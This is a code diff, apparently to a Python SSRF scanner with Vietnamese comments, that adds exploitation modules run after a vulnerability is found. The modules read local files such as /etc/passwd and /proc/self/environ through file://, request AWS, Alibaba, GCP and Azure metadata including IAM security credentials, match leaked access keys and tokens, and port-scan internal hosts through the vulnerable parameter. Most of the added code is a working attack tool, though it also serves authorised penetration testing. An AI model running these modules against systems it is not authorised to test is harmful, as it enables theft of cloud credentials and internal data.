@@ -552,6 +552,139 @@ def print_conclusion(findings, url, params, data=None, cookie=None) -> None:
     print("\n" + "#" * 66 + "\n")
 
 
+# =============================================================================
+#  PHAN 4b - EXPLOITATION MODULES (khai thac sau khi phat hien SSRF)
+#  Y tuong lay cam hung tu SSRFmap (swisskyrepo), viet lai doc lap. CHI DOC du lieu.
+# =============================================================================
+EXPLOIT_FILES = [
+    "file:///etc/passwd", "file:///etc/hosts", "file:///etc/hostname",
+    "file:///proc/self/environ", "file:///proc/self/cmdline",
+    "file:///C:/Windows/win.ini", "file:///C:/Windows/System32/drivers/etc/hosts",
+]
+
+# (ten, URL metadata, header can thiet neu co). Nhieu provider (GCP/Azure) yeu cau
+# header dac biet -> qua SSRF thuong KHONG dat duoc header, nen chi ky vong AWS/Alibaba.
+CLOUD_ENDPOINTS = [
+    ("AWS - danh sach IAM role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+    ("AWS - user-data", "http://169.254.169.254/latest/user-data"),
+    ("AWS - instance-id", "http://169.254.169.254/latest/meta-data/instance-id"),
+    ("Alibaba - metadata", "http://100.100.100.100/latest/meta-data/"),
+    ("GCP - project (can header Metadata-Flavor)", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
+    ("Azure - instance (can header Metadata:true)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+]
+
+PORTSCAN_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8000, 9200, 27017, 11211]
+
+
+import re as _re
+
+# Dau hieu GIA TRI credential/metadata that (khong xuat hien khi app chi echo lai URL).
+CLOUD_VALUE_SIGNS = [
+    _re.compile(r'"AccessKeyId"'), _re.compile(r'"SecretAccessKey"'),
+    _re.compile(r'"Token"\s*:'), _re.compile(r'\bASIA[0-9A-Z]{8,}'),   # AWS temp key
+    _re.compile(r'\bAKIA[0-9A-Z]{8,}'),                                # AWS key
+    _re.compile(r'\bi-[0-9a-f]{8,}\b'),                                # instance-id value
+    _re.compile(r'ssh-rsa AAAA'), _re.compile(r'-----BEGIN'),
+]
+
+
+def _snippet(body: str, limit: int = 300) -> str:
+    s = " ".join(body.split())
+    return s[:limit] + (" ..." if len(s) > limit else "")
+
+
+def _snippet_around(body: str, needle: str, span: int = 320) -> str:
+    """Cat doan quanh vi tri `needle` (de lay NOI DUNG that, khong phai vo HTML)."""
+    i = body.lower().find(needle.lower())
+    if i < 0:
+        return _snippet(body)
+    seg = body[max(0, i - 20): i - 20 + span]
+    return " ".join(seg.split())
+
+
+def _extract(scanner, url, data, loc, param, payload_value):
+    u, d = _apply(url, data, loc, param, payload_value)
+    return scanner._request(u, d)
+
+
+def mod_readfiles(scanner, url, data, loc, param) -> None:
+    print("\n  [module: readfiles] doc file noi bo qua file://")
+    hit = False
+    for payload in EXPLOIT_FILES:
+        resp, elapsed, err = _extract(scanner, url, data, loc, param, payload)
+        if resp is None:
+            continue
+        body = resp.body
+        matched = next((sig for sig in FILE_SIGNATURES if sig.lower() in body.lower()), None)
+        if matched:
+            hit = True
+            print(f"    [+] {payload}")
+            print(f"        {_snippet_around(body, matched, 360)}")
+    if not hit:
+        print("    [-] khong doc duoc file nao (co the bi chan scheme file://).")
+
+
+def mod_cloud(scanner, url, data, loc, param) -> None:
+    print("\n  [module: cloud] lay metadata dich vu cloud")
+    hit = False
+    for name, endpoint in CLOUD_ENDPOINTS:
+        resp, elapsed, err = _extract(scanner, url, data, loc, param, endpoint)
+        if resp is None or resp.status is None or resp.status >= 400 or not resp.body.strip():
+            continue
+        # chi nhan khi co GIA TRI credential/metadata that (tranh bao nham do app echo URL)
+        m = next((p.search(resp.body) for p in CLOUD_VALUE_SIGNS if p.search(resp.body)), None)
+        if m:
+            hit = True
+            print(f"    [+] {name}")
+            print(f"        {endpoint}")
+            print(f"        {_snippet_around(resp.body, m.group(0), 360)}")
+    if not hit:
+        print("    [-] khong lay duoc metadata (khong chay tren cloud, hoac bi chan IP 169.254.x).")
+
+
+def mod_portscan(scanner, url, data, loc, param, host="127.0.0.1") -> None:
+    print(f"\n  [module: portscan] quet cong noi bo tren {host} qua SSRF")
+    # Baseline: cong gan nhu chac chan DONG -> de so sanh phan biet open/closed
+    # (nhieu app boc moi response trong trang cua no, nen khong the chi check 'co response').
+    bresp, bt, berr = _extract(scanner, url, data, loc, param, f"http://{host}:1/")
+    base_len = bresp.length if bresp else -1
+    found_open = False
+    for port in PORTSCAN_PORTS:
+        resp, elapsed, err = _extract(scanner, url, data, loc, param, f"http://{host}:{port}/")
+        if resp is None and elapsed >= scanner.timeout - 0.4:
+            state = "FILTERED (timeout)"
+        elif resp is None:
+            state = f"CLOSED ({err})"
+        elif base_len >= 0 and abs(resp.length - base_len) > 60:
+            state = "OPEN (phan hoi khac han cong dong)"
+            found_open = True
+        else:
+            state = "closed/khong phan biet duoc"
+        print(f"    - {host}:{port:<6} {state}   [{elapsed:.2f}s]")
+    if not found_open:
+        print("    [i] khong thay cong mo ro rang (hoac SSRF khong cho fetch IP noi bo).")
+
+
+def run_exploit(scanner, url, data, points, modules) -> None:
+    if not points:
+        print("\n [!] Khong co diem chen de khai thac.")
+        return
+    loc, param = points[0]  # dung diem chen dau tien
+    print("\n" + "#" * 66)
+    print(f"#  EXPLOITATION  (diem chen: {loc}:{param})")
+    print("#" * 66)
+    want = set(modules)
+    if "all" in want:
+        want = {"readfiles", "cloud", "portscan"}
+    if "readfiles" in want:
+        mod_readfiles(scanner, url, data, loc, param)
+    if "cloud" in want:
+        mod_cloud(scanner, url, data, loc, param)
+    if "portscan" in want:
+        mod_portscan(scanner, url, data, loc, param)
+    print("\n" + "#" * 66 + "\n")
+
+
 def save_json(findings, params, path: str) -> None:
     data = {
         "vulnerability": "SSRF",
@@ -715,6 +848,10 @@ def main() -> int:
                          "xem callback tren dashboard dich vu (tool chi tu xac nhan khi dung --oast-listen).")
     ap.add_argument("--oast-listen", type=int,
                     help="Tu mo server canary HTTP cuc bo o cong nay (tu dong xac nhan callback).")
+    # Khai thac (chay sau khi phat hien SSRF)
+    ap.add_argument("-m", "--modules",
+                    help="Chay module khai thac (ngan cach dau phay): readfiles, cloud, portscan, all.")
+    ap.add_argument("--exploit", action="store_true", help="Alias cho -m all.")
     ap.add_argument("-o", "--output", help="Luu bao cao ra file JSON.")
     ap.add_argument("--no-banner", action="store_true")
     args = ap.parse_args()
@@ -790,6 +927,14 @@ def main() -> int:
                      cookie=scanner.cookie_header() or None)
     if args.output:
         save_json(findings, params, args.output)
+
+    # Khai thac neu duoc yeu cau (-m / --exploit)
+    modules = [m.strip() for m in (args.modules or "").split(",") if m.strip()]
+    if args.exploit:
+        modules.append("all")
+    if modules:
+        points = find_injection_points(args.url, args.data, args.param)
+        run_exploit(scanner, args.url, args.data, points, modules)
 
     serious = [f for f in findings if f.verdict in ("CONFIRMED", "LIKELY")]
     return 1 if serious else 0
